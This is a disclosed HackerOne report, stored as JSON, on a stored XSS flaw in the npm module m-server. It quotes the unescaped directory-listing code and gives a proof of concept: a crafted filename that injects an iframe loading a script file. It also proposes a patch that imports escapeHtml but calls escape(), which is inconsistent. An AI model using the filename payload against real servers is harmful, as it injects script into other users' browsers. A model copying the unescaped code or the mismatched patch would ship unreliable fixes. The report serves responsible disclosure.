{
  "id": 319794,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTk3OTQ=",
  "url": "https://hackerone.com/reports/319794",
  "title": "[m-server] HTML Injection in filenames displayed as directory listing in the browser allows to embed iframe with malicious JavaScript code",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-02-26T14:11:20.512Z",
  "submitted_at": "2018-02-26T14:11:20.512Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-16484"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-07-12T08:41:30.324Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-06-12T08:41:18.296Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report Stored XSS vulnerability in ```m-server``` module.\n```m-server``` displays content of selected directory as HTML in the browser. However, no escape is implemented which allows malicious user to embed executable JavaScript or HTML code (eg. to load HTML document into ```iframe``` element and execute JavaScript from within loaded file).\n\n## Module\n\n**module name:** m-server\n**version:** 1.4.0\n**npm page:** https://www.npmjs.com/package/m-server\n\n### Module Description\n\nM-Server is a mini http static server that without any dependencies;\n\n### Module Stats\n\nStats\n6 downloads in the last day\n68 downloads in the last week\n180 downloads in the last month\n\n~2200 estimated downloads per year\n\n## Vulnerability Description\n\nNo HTML special characters escape is implememtned in the function which constructs and returns HTML with current directory listing:\n\n\n```javascript\n// node_modules/m-server/lib/utils.js, line 57\n\n    dirs.sort(sort).forEach(function (val) {\n        html.push('<li><a href=\"' + path + '/' + val + '\">' + val + '</a></li>');\n    });\n    files.sort(sort).forEach(function (val) {\n        html.push('<li><a download href=\"' + path + '/' + val + '\">' + val + '</a></li>');\n    });\n    html.push('</ul>');\n    return html.join('');\n```\n\n\n## Steps To Reproduce:\n\n- install ```m-server``` module:\n\n```\n$ npm install m-server\n```\n\n- create ```malware_frame.html``` file with following content:\n\n```html\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script>\n        alert('Uh oh, I am bad, bad malware!!!')\n    </script>\n</body>\n\n</html>\n```\n\n- in the same directory, create another file with following name:\n\n```\n\"><iframe src=\"malware_frame.html\">\n```\n\n- run ```m-server``` in the same directory, where two above files exist:\n\n```\n$ ./node_modules/m-server/index.js -p 8080\n-------------------------------------------------------------\n\tMini http server running on port 8080 !\n\tYou can open the floowing urls to view files.\n\t127.0.0.1:8080\n\t10.235.1.22:8080\n\t10.235.4.26:8080\n\tHave fun ^_^\n-------------------------------------------------------------\n\n```\n\n- malicious frame is embedded and JavaScript code from ```malware_frame.html``` executed immediately:\n\n{F267014}\n\n\nBoth files can be uploaded by malicious user if eg. other vunerabilities in other applications exist on the same server (eg. upload file feature) or if attacker gains an access to the server using poorly secured remote access.\n\n\n## Patch\n\n```escape-html``` module can be used to prevent this attack (https://www.npmjs.com/package/escape-html):\n\n```javascript\nconst escapeHtml = require('escape-html')\n\n(...)\n\n// vulnerable part of node_modules/m-server/lib/utils.js:\ndirs.sort(sort).forEach(function (val) {\n    html.push('<li><a href=\"' + path + '/' + escape(val) + '\">' + escape(val) + '</a></li>');\n});\nfiles.sort(sort).forEach(function (val) {\n    html.push('<li><a download href=\"' + path + '/' + escape(val) + '\">' + escape(val) + '</a></li>');\n});\nhtml.push('</ul>');\nreturn html.join('');\n\n```\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- curl 7.47.0\n\n## Wrap up\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nMalicious user is able to inject iframe element with malicious JavaScript code via crafted filename when directory listing is displayed in the browser\n\nThe hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttp://localhost:8080\n\n**Verified**\nYes\n\n",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 267014,
      "file_name": "1.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/267/014/75ff534f53d41a286e6a6002d6c025032e64c9ea/1.jpg?response-content-disposition=attachment%3B%20filename%3D%221.jpg%22%3B%20filename%2A%3DUTF-8%27%271.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX64GUFQ3%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T174121Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCM9doRXzYsTjzqpu4fpGC15lhKQyDYolY9SO%2F8j2ACPwIgI9PsMm3ZJycpcs1Hg2Toek9qtjvYqapzpR2Nxt1eXVMqsQUIGhADGgwwMTM2MTkyNzQ4NDkiDBZb5U3216C7k8aD7yqOBeoKtN%2FQM7LvZgrR6JAT98pVaZNMNBP9Op2x4kLkqXZUvklTwPCOP%2BUKxl8ShDILEY%2BN4YgawRh4Gb2Aipfi%2BKOoggTNY68T1hTI1WVFhUTeXaDdJcScxF4BOLmaPfuWeov9rsn%2FM7jsK4j0S3KkYvjuoM8YBh5PQTKS99JUJiObvsYb148eitRF1eBwGP7erZV%2F0L9%2BtSws5YLXFME%2FdRyHYTf7l259h8zADaT0LEKQ0ZwfBRRu%2B3HYvuNzyXVc1Ws0laQ1MuWau3vvGxOVgd%2Bly9L%2FUE0Q%2FinpwSCTqTMI%2BKX3JR3goQ4vju8kqdZUitdzHMZ078huACJCuXv%2FPWiT5OIQ2TteF%2B26hkHZyGynli%2B9NTdiZVfAxodTm3kkhO%2FhoOt5MO4iQTRxcz6usgQNEWPpLkAeUxD29BqdG8I78TuqFqE7lV3g%2FyR%2FPrn6FjHoctG%2B67OHBvO1OhC4nkxy2pKNXWnpBfeGH%2FWSo6ldxKs8YgbP4kH1%2B4raRRqS7lGuuasLBbFP1Q0SgNFrS%2FTC8Zxykbm72%2BsyB1B1uMxiqZ4yQTVOvkrSFzXUNMUPF6MVFxVjx8lFOy1tWd5PIV1OsodR%2FY7PA2uBuzAiU44ByY7ONVhCsrA8mUDX1D%2B5J3ka3rmShJKWdRgBERh2s33NKQ9GSF5q3365DFKu7FbY1%2FW3fI2PbrCd5xOxbp%2FWYY6jIzvRBJKaCfS2U839rKeDt9OjllgDSSLq7%2Fxy5%2FJHGZ4hPV5n7qZ1ZOzPH%2FSm3dISrbb9Ws%2Bov6WNGYu4w2XQHXqnNKrwebbYp4aIiULWCdU7PNEIhsY1kRTHykdGFYq4soSGP6e3eCcxds%2BMcfVsnnJMBOFyeN7pG1TLxTCP0cDGBjqxAYPctFWf03h5uKrEWC%2FIZPRsmCjClE%2BSXcGCEm6nV1wGqJPvbHffTvfHHAlho%2FqzXzIv1ZzsLW4h9sT52Eo%2B9amYEEVrJO%2BzJqYBh08gW7TScGPtZtxb8oXb5jdy9XIzFVeHvWJY8wx2VJogvEjcXaCAFaYTPk4F61xY0mVJarXPts6hnnHId6d8mDNIjpUm%2BZdtp5ic5G6%2FJ9RIyHOTRqWaOGqTOzHvUdFfuOuZoZPTtw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=77029ae2eb79608d343cfb0ca5aab44ddd46ffece771547c6820c2254a4837ee",
      "file_size": 39526,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-07-12T08:41:18.412Z",
  "allow_singular_disclosure_after": -227091602.98979115,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "whitesector",
    "eveeez",
    "khaledibnalwalid"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.0,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 8254,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "m-server",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
